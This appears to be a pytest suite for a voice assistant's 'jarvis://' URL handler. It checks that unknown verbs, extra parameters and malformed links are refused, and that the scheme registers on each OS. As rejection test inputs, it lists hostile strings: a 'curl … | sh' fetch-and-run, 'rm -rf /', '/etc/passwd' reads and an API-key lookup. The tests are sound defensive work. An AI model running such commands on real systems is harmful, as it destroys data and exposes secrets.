"""`jarvis://` — the address, and everything it must refuse.

WHY MOST OF THIS FILE IS ABOUT REJECTION
    A URL is the only input this program takes that anybody can send it. It
    arrives from a browser, a chat message, a web page, a shell alias — every
    one of those can call `open` with anything at all. So the interesting
    question is never "does `jarvis://summon` work" (it is four lines) but "what
    happens when somebody sends `jarvis://run?cmd=curl … | sh`".

    The answer has to be a REJECTION THAT CANNOT BE CONFUSED FOR SUCCESS, and
    that is what these tests check: unknown verbs, parameters that mean nothing,
    userinfo, ports, fragments, oversized text, control characters. Nothing is
    repaired on the way in — text that was edited to fit is text that says
    something the sender did not write.

    `dispatch` is checked too, because the failure there is quiet: a link that
    said something into a session that was not running must report failure, or
    the caller closes with no message and the user cannot tell it did nothing.
"""
from __future__ import annotations

import os

import pytest

from core import deeplink as dl


# ── what works ──────────────────────────────────────────────────────────────

@pytest.mark.parametrize("url,verb", [
    ("jarvis://summon", "summon"),
    ("jarvis://hide", "hide"),
    ("jarvis:summon", "summon"),            # no slashes — browsers pass this on
    ("JARVIS://SUMMON", "summon"),          # normalised case
    ("  jarvis://summon  ", "summon"),      # a shell alias may add spaces
    ("jarvis://summon/", "summon"),         # trailing slash
])
def test_the_verbs_parse(url, verb):
    assert dl.parse(url).verb == verb


def test_ask_carries_its_text_url_encoded():
    request = dl.parse("jarvis://ask?text=remind%20me%20at%20four")
    assert request.verb == "ask"
    assert request.text == "remind me at four"


def test_ask_keeps_punctuation_and_unicode():
    """The text is speech, not a token: it must arrive as the user wrote it."""
    text = "Set a timer for 10 minutes — then tell me, \"done\". Terima kasih!"
    import urllib.parse
    request = dl.parse("jarvis://ask?text=" + urllib.parse.quote(text))
    assert request.text == text


# ── what must never work ────────────────────────────────────────────────────

UNKNOWN_VERBS = [
    "jarvis://run?cmd=curl%20http://x%20|%20sh",
    "jarvis://exec",
    "jarvis://open?path=/etc/passwd",
    "jarvis://config?key=gemini_api_key",
    "jarvis://quit",                       # deliberately NOT in the vocabulary
    "jarvis://wake",
]


@pytest.mark.parametrize("url", UNKNOWN_VERBS)
def test_nothing_but_the_three_verbs_exists(url):
    """The vocabulary is the tray's, plus `ask`. No command, no path, no config.

    `quit` is absent on purpose: a web page that can end the assistant is not a
    feature, and the tray already offers it to the person at the keyboard.
    """
    with pytest.raises(dl.Rejected):
        dl.parse(url)


@pytest.mark.parametrize("url", [
    "jarvis://summon?text=hello",          # summon takes no parameters
    "jarvis://hide?force=1",
    "jarvis://ask?text=hi&run=rm",         # and ask takes no other parameter
    "jarvis://ask",                        # nothing to say
    "jarvis://ask?text=",                  # same, spelled out
])
def test_parameters_that_mean_nothing_are_refused(url):
    with pytest.raises(dl.Rejected):
        dl.parse(url)


@pytest.mark.parametrize("url", [
    "jarvis://user:pass@summon",           # userinfo
    "jarvis://summon:8080",                # a port
    "jarvis://summon#fragment",            # a fragment
    "jarvis://summon/extra/path",          # a path
])
def test_parts_that_mean_nothing_here_are_refused(url):
    """Accepted quietly, each of these is a parser and a caller disagreeing
    about what was asked — which is the shape of most URL bugs."""
    with pytest.raises(dl.Rejected):
        dl.parse(url)


@pytest.mark.parametrize("url", [
    "",
    "   ",
    "https://example.com",
    "file:///etc/passwd",
    "jarvis:",
    "jarvis://",
    "not a url at all",
])
def test_not_a_link_is_refused(url):
    with pytest.raises(dl.Rejected):
        dl.parse(url)


def test_text_is_capped_and_not_truncated():
    """Truncating would deliver a sentence the sender did not write."""
    too_long = "a" * (dl.MAX_TEXT + 1)
    with pytest.raises(dl.Rejected) as caught:
        dl.parse(f"jarvis://ask?text={too_long}")
    assert str(dl.MAX_TEXT) in str(caught.value)

    exact = "a" * dl.MAX_TEXT
    assert dl.parse(f"jarvis://ask?text={exact}").text == exact


@pytest.mark.parametrize("bad", ["%00", "%0a", "%1b", "%7f"])
def test_control_characters_are_refused_not_stripped(bad):
    """Removing them changes the sentence; refusing says the link was wrong."""
    with pytest.raises(dl.Rejected):
        dl.parse(f"jarvis://ask?text=hello{bad}world")


def test_a_non_string_is_refused_without_raising_something_else():
    with pytest.raises(dl.Rejected):
        dl.parse(None)          # type: ignore[arg-type]


# ── the rejection message is for a person ──────────────────────────────────

def test_the_rejection_names_what_is_understood():
    with pytest.raises(dl.Rejected) as caught:
        dl.parse("jarvis://launch?x=1")
    message = str(caught.value)
    assert "launch" in message
    for verb in dl.VERBS:
        assert verb in message


# ── dispatch ────────────────────────────────────────────────────────────────

def _recorder():
    calls = {"summon": 0, "hide": 0, "asked": []}

    def summon():
        calls["summon"] += 1

    def hide():
        calls["hide"] += 1

    def ask(text):
        calls["asked"].append(text)
        return True

    return calls, summon, hide, ask


def test_dispatch_runs_the_one_handler_it_should():
    calls, summon, hide, ask = _recorder()
    dl.dispatch(dl.parse("jarvis://summon"), summon=summon, hide=hide, ask=ask)
    assert (calls["summon"], calls["hide"], calls["asked"]) == (1, 0, [])

    dl.dispatch(dl.parse("jarvis://hide"), summon=summon, hide=hide, ask=ask)
    assert (calls["summon"], calls["hide"]) == (1, 1)

    dl.dispatch(dl.parse("jarvis://ask?text=hi"), summon=summon, hide=hide, ask=ask)
    assert calls["asked"] == ["hi"]


def test_a_link_that_could_not_be_delivered_reports_failure():
    """The session may not be up. Saying nothing happened is the honest answer."""
    calls, summon, hide, _ask = _recorder()

    def ask(_text):
        return False

    assert dl.dispatch(dl.parse("jarvis://ask?text=hi"),
                       summon=summon, hide=hide, ask=ask) is False
    assert calls["asked"] == []


# ── what each OS is told, byte for byte ────────────────────────────────────

def test_the_windows_command_quotes_the_url_placeholder(tmp_path):
    """`%1` is the URL. Unquoted, `C:\\Program Files\\…` splits at the space."""
    script = tmp_path / "Mark LVI" / "main.py"
    command = dl.windows_command(str(script), python=r"C:\Python311\python.exe")
    assert command == f'"C:\\Python311\\python.exe" "{script}" "%1"'


def test_the_linux_handler_takes_a_single_url(tmp_path):
    script = tmp_path / "Mark LVI" / "main.py"
    text = dl.linux_desktop_text(str(script), python="/usr/bin/python3")

    assert "MimeType=x-scheme-handler/jarvis;" in text
    assert "NoDisplay=true" in text, "a handler is not a menu entry"

    exec_line = next(l for l in text.splitlines() if l.startswith("Exec="))
    from core import autostart
    argv = autostart._split_desktop_command(exec_line[len("Exec="):])
    # `%u` (one URL), never `%U` (a list) or `%f` (a file, with the scheme
    # stripped) — each of those produces a handler that starts and cannot read
    # what it was given.
    assert argv[-1] == "%u"
    assert argv[1] == str(script)


def test_the_mac_bundle_fragment_is_well_formed_xml():
    """It gets pasted into Info.plist; a fragment that will not parse there is
    a bundle that silently never receives the scheme."""
    import xml.etree.ElementTree as ET

    fragment = dl.mac_info_plist()
    root = ET.fromstring(f"<plist><dict>{fragment}</dict></plist>")
    strings = [e.text for e in root.iter("string")]
    assert "jarvis" in strings
    assert "com.jarvis.assistant" in strings


def test_the_scheme_constant_matches_what_is_written_everywhere():
    """One string, four places: the parser, two entry formats and the docs."""
    assert dl.SCHEME == "jarvis"
    assert f"x-scheme-handler/{dl.SCHEME}" in dl.linux_desktop_text("/x/main.py")
    assert f"<string>{dl.SCHEME}</string>" in dl.mac_info_plist()


# ── the wiring: an OS-started launch with a URL on the command line ────────

def _launch_parser():
    """`main._parse_args` without importing main.py (it needs sounddevice)."""
    import ast
    import sys as _sys
    import types
    from dataclasses import dataclass
    from pathlib import Path

    root = Path(__file__).resolve().parent.parent
    tree = ast.parse((root / "main.py").read_text(encoding="utf-8"))
    wanted = [n for n in tree.body
              if isinstance(n, ast.ClassDef) and n.name == "LaunchOptions"]
    wanted += [n for n in tree.body
               if isinstance(n, ast.FunctionDef) and n.name == "_parse_args"]
    module = types.ModuleType("main_launch_under_test")
    module.__file__ = str(root / "main.py")
    module.sys = _sys
    module.dataclass = dataclass
    module._deeplink = dl
    _sys.modules["main_launch_under_test"] = module
    exec(compile(ast.Module(body=wanted, type_ignores=[]), "main.py", "exec"),
         module.__dict__)
    return module._parse_args


@pytest.fixture(scope="module")
def parse_args():
    return _launch_parser()


def test_a_url_on_the_command_line_is_parsed_and_withheld_from_qt(parse_args):
    """The OS appends the URL to argv; Qt must not see it.

    Qt is documented to consume or refuse arguments it does not recognise, and
    `jarvis://ask?text=…` sitting in `sys.argv` is an argument it cannot mean.
    """
    options, keep = parse_args(["jarvis://ask?text=hi"])
    assert options.link is not None and options.link.verb == "ask"
    assert keep == [], "the URL must not be passed on to QApplication"


def test_a_bad_url_is_recorded_and_the_app_still_starts(parse_args):
    """Refusing to START because a link was malformed would be worse than saying
    so: the user may be clicking a bad shortcut while nothing is running."""
    options, keep = parse_args(["jarvis://run?cmd=rm%20-rf%20/"])
    assert options.link is None
    assert options.link_error, "the refusal must be carried, not dropped"
    assert keep == []


def test_a_link_implies_the_window_without_a_special_case(parse_args):
    """`force_window` is the single decision point, so a link sets it too."""
    options, _ = parse_args(["jarvis://summon"])
    assert options.force_window is True

    options, _ = parse_args(["jarvis://summon", "--hidden"])
    assert options.hidden is False, "a link is an instruction; hiding it swallows it"
    assert options.force_window is True


def test_an_ordinary_launch_carries_no_link(parse_args):
    options, _ = parse_args([])
    assert options.link is None and options.link_error == ""
    assert options.force_window is False


# ── the wiring: what lifecycle does with it ────────────────────────────────

def _lifecycle():
    import importlib.util
    import sys as _sys
    from pathlib import Path

    root = Path(__file__).resolve().parent.parent
    spec = importlib.util.spec_from_file_location("lifecycle_link_under_test",
                                                  root / "ui" / "lifecycle.py")
    module = importlib.util.module_from_spec(spec)
    _sys.modules["lifecycle_link_under_test"] = module
    spec.loader.exec_module(module)
    return module


def test_a_refused_link_is_reported_where_a_person_can_see_it():
    """The whole failure mode: a shortcut that does nothing and says nothing."""
    from types import SimpleNamespace

    lifecycle = _lifecycle()
    notes = []
    lifecycle.note = lambda shell, text: notes.append(text)

    shell = SimpleNamespace(_launch=SimpleNamespace(link=None, link_error="too long"))
    assert lifecycle.run_deeplink(shell) is False
    assert any("refused" in n and "too long" in n for n in notes), notes


def test_an_ask_link_goes_through_the_same_door_as_a_typed_message():
    """`on_text_command` — the entry a typed message and a spoken turn both use.

    If a link could reach a tool directly, the link would be a second, unchecked
    command channel. It cannot: the only thing it can do is say something.
    """
    from types import SimpleNamespace

    lifecycle = _lifecycle()
    lifecycle.note = lambda shell, text: None
    lifecycle.summon = lambda shell: None
    lifecycle.dismiss = lambda shell: None

    sent = []
    shell = SimpleNamespace(_launch=SimpleNamespace(link=dl.Request("ask", "hi there"),
                                                    link_error=""),
                            on_text_command=lambda text: sent.append(text))
    import threading
    # The send runs on a thread; wait for it rather than sleeping blindly.
    assert lifecycle.run_deeplink(shell) is True
    for thread in threading.enumerate():
        if thread is not threading.current_thread():
            thread.join(timeout=2)
    assert sent == ["hi there"]


def test_an_ask_link_before_the_session_exists_fails_loudly():
    from types import SimpleNamespace

    lifecycle = _lifecycle()
    notes = []
    lifecycle.note = lambda shell, text: notes.append(text)

    shell = SimpleNamespace(_launch=SimpleNamespace(link=dl.Request("ask", "hi"),
                                                    link_error=""))
    assert lifecycle.run_deeplink(shell) is False
    assert any("before the session" in n for n in notes), notes


def test_hide_and_summon_links_are_the_trays_own_two_actions():
    from types import SimpleNamespace

    lifecycle = _lifecycle()
    lifecycle.note = lambda shell, text: None
    called = []
    lifecycle.summon = lambda shell: called.append("summon")
    lifecycle.dismiss = lambda shell: called.append("dismiss")

    shell = SimpleNamespace(_launch=SimpleNamespace(link=dl.Request("summon"),
                                                    link_error=""))
    assert lifecycle.run_deeplink(shell) is True
    shell._launch = SimpleNamespace(link=dl.Request("hide"), link_error="")
    assert lifecycle.run_deeplink(shell) is True
    assert called == ["summon", "dismiss"]


# ── registering the scheme, not just describing it ─────────────────────────
#
# The text builders above are asserted byte-for-byte. These write real files on
# the one platform this sandbox is, and stand in for the registry and the
# bundle on the other two — the same split `core/autostart.py` uses, for the
# same reason: the format is the part that can be checked anywhere.

@pytest.fixture()
def data_home(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "share"))
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    return tmp_path / "share"


@pytest.fixture()
def no_subprocess(monkeypatch):
    """Record the cache-rebuild commands instead of running them."""
    calls = []
    monkeypatch.setattr(dl.subprocess, "run",
                        lambda argv, **kw: calls.append(argv))
    return calls


def test_the_linux_handler_is_written_where_the_desktop_reads_it(data_home, no_subprocess, tmp_path):
    script = tmp_path / "main.py"
    script.write_text("", encoding="utf-8")

    assert dl.register(script, os_name="Linux") is True

    path = data_home / "applications" / "jarvis-handler.desktop"
    assert path.is_file()
    assert dl.registered("Linux") is True
    # Rebuilt caches, both best-effort. The file is the part that must be right.
    assert any("update-desktop-database" in argv[0] for argv in no_subprocess)
    assert any(argv[:2] == ["xdg-mime", "default"] for argv in no_subprocess)


@pytest.mark.skipif(os.name == "nt",
                    reason="POSIX permission bits do not exist on Windows, so "
                           "chmod cannot take the bit away and the assertion "
                           "would test nothing")
def test_the_linux_handler_is_executable(data_home, no_subprocess, tmp_path):
    """A `.desktop` without the bit is one the desktop silently ignores."""
    script = tmp_path / "main.py"
    script.write_text("", encoding="utf-8")
    dl.register(script, os_name="Linux")
    assert dl.registered("Linux") is True
    (data_home / "applications" / "jarvis-handler.desktop").chmod(0o644)
    assert dl.registered("Linux") is False, "not executable, so not registered"


def test_register_and_unregister_leave_no_trace(data_home, no_subprocess, tmp_path):
    script = tmp_path / "main.py"
    script.write_text("", encoding="utf-8")
    dl.register(script, os_name="Linux")
    assert dl.unregister(os_name="Linux") is True
    assert dl.registered("Linux") is False
    assert not (data_home / "applications" / "jarvis-handler.desktop").exists()


def test_unregistering_something_that_was_never_registered_is_not_an_error(data_home, no_subprocess):
    assert dl.unregister(os_name="Linux") is True


def test_a_missing_update_desktop_database_does_not_fail_the_registration(data_home, tmp_path, monkeypatch):
    """The handler file is already correct; the cache rebuild is optional.

    `update-desktop-database` is not installed on every system, and a shell-out
    that raises must not report the whole registration as failed.
    """
    def _missing(argv, **kw):
        raise FileNotFoundError(argv[0])

    monkeypatch.setattr(dl.subprocess, "run", _missing)
    script = tmp_path / "main.py"
    script.write_text("", encoding="utf-8")
    assert dl.register(script, os_name="Linux") is True


def test_the_mac_bundle_gets_a_launcher_and_a_url_type(tmp_path, monkeypatch):
    """macOS only registers a URL type from a `.app`, so one has to be written."""
    home = tmp_path / "home"
    monkeypatch.setattr(dl.Path, "home", classmethod(lambda cls: home))
    calls = []
    monkeypatch.setattr(dl.subprocess, "run", lambda argv, **kw: calls.append(argv))

    script = tmp_path / "main.py"
    script.write_text("", encoding="utf-8")
    assert dl.register(script, os_name="Darwin") is True

    app = home / "Applications" / "J.A.R.V.I.S.app"
    plist = (app / "Contents" / "Info.plist").read_text()
    assert "CFBundleURLTypes" in plist and "<string>jarvis</string>" in plist
    launcher = (app / "Contents" / "MacOS" / "JARVIS").read_text()
    assert str(script) in launcher and '"$@"' in launcher, (
        "the launcher must forward the URL it was opened with")
    assert any("lsregister" in " ".join(argv) for argv in calls), (
        "a freshly written Info.plist needs the bundle re-registered")
    assert dl.registered("Darwin") is True


def test_the_windows_registration_marks_the_key_as_a_protocol(tmp_path, monkeypatch):
    """`URL Protocol` — an EMPTY-named value — is what makes Windows treat the
    key as a scheme. Without it regedit looks right and nothing happens."""
    written = {}

    class _Key:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    import types
    fake = types.ModuleType("winreg")
    fake.HKEY_CURRENT_USER = 1
    fake.KEY_WRITE = 2
    fake.KEY_READ = 4
    fake.REG_SZ = 1
    fake.CreateKeyEx = lambda root, path, r, access: _Key()
    fake.SetValueEx = lambda key, name, r, kind, value: written.__setitem__(
        (path_of(key), name), value)
    fake.OpenKey = lambda *a, **k: _Key()
    fake.QueryValueEx = lambda key, name: (written.get((_CURRENT[0], name), ""), 1)

    path_of = lambda key: _CURRENT[0]  # noqa: E731
    _CURRENT = [""]

    def _create(root, path, r, access):
        _CURRENT[0] = path
        return _Key()

    fake.CreateKeyEx = _create
    monkeypatch.setitem(__import__("sys").modules, "winreg", fake)

    script = tmp_path / "main.py"
    script.write_text("", encoding="utf-8")
    dl._enable_windows_scheme(str(script))

    key = r"Software\Classes\jarvis"
    assert written[(key, "URL Protocol")] == ""
    assert written[(key + r"\shell\open\command", "")].endswith('"%1"')
    assert written[(key, "")] == "URL:jarvis protocol"


def test_the_setup_drawer_offers_the_scheme_and_reads_it_back():
    """The button is the only way a user turns this on.

    Two things must hold: it exists in the SETUP drawer next to auto-start, and
    its label comes from `deeplink.registered()` — a fact on disk — not from a
    flag the app remembers. A remembered flag would say ON after the OS entry
    was deleted by hand, which is exactly the failure auto-start had.
    """
    import ast

    from pathlib import Path
    # Read, do not import: `ui/window.py` needs PyQt6, which is absent here.
    # Explicit encoding: Windows defaults to cp1252 and `ui/window.py` is
    # full of glyphs, which is exactly how this test first went red in CI.
    src = (Path(__file__).resolve().parent.parent / "ui" / "window.py").read_text(
        encoding="utf-8")
    tree = ast.parse(src)
    names = {n.name: n for n in ast.walk(tree)
             if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))}
    assert "_toggle_deeplink" in names and "_update_link_btn" in names

    toggle = ast.get_source_segment(src, names["_toggle_deeplink"])
    assert "registered()" in toggle
    assert "unregister()" in toggle
    assert "register(" in toggle
    # The running program's path, never a path derived from __file__.
    assert "program_path(" in toggle
    assert "__file__" not in toggle

    upd = ast.get_source_segment(src, names["_update_link_btn"])
    assert "registered()" in upd

    # Wired: the button is created and connected somewhere.
    assert "_link_btn.clicked.connect(self._toggle_deeplink)" in src
